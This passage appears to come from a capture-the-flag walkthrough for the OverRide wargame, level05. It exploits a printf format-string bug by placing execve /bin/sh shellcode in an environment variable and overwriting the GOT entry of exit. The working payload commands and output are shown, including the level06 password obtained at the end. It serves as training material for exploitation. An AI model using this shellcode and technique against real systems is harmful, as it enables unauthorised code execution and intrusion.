unprotected `printf` is what we will exploit, let's find the offset:
```bash
level05@OverRide:~$ python -c 'print("AAAA %x %x %x %x %x %x %x %x %x %x")' | ./level05 
aaaa 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161
```
So the offset is 10.

We'll overwrite the got entry of `exit` with the address of our shellcode.
```
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```
> https://github.com/alexandre-hallaine/Rainfall/blob/e45e4fae62fd1a9b2755a1f970f3c035f25a5d05/level5/walkthrough.md

We need to write in `0x80497e0` with the address of something, in our case a shellcode.

```bash
export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```
We'll write and run a C program to find the address of the environment variable:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("EXPLOIT"));
    return 0;
}
```
```
level05@OverRide:/tmp$ ./env 
0xffffd82f
```
> That address will be different for you, you'll have to change it in the payload.

`0xffffd82f` in decimal is `4294957103`, that's bigger than INT_MAX therefore we'll have to cut it in half (2 bytes / 2 bytes).

so we need to write `0xffff` and `0xd82f` in the address `0x80497e0` and `0x80497e2` respectively. So `0xffff` in decimal is `65535` and `0xd82f` in decimal is `55343`.
Let's construct our payload logic:
```
0x80497e0 + 0x80497e2 + 55343 (to write into 0x80497e0) + 65535 (to write into 0x80497e2)

Now because we already wrote 55343 bytes, we need to write 65535 - 55343 = 10192 bytes for the second value.
Futhermore, we already wrote 8 bytes for the adresses of the got entry for `exit` therefore 55343 - 8 = 55335 bytes for the first value.

Let's fix that:
0x80497e0 + 0x80497e2 + 55335 (to write into 0x80497e0) + 10192 (to write into 0x80497e2)
```

Our actual payload:
```bash
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55335x%10$hn%10192x%11$hn")'; cat)| ./level05
```

Let's run it:
```bash
(python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55335x%10$hn%10192x%11$hn")'; cat)| ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```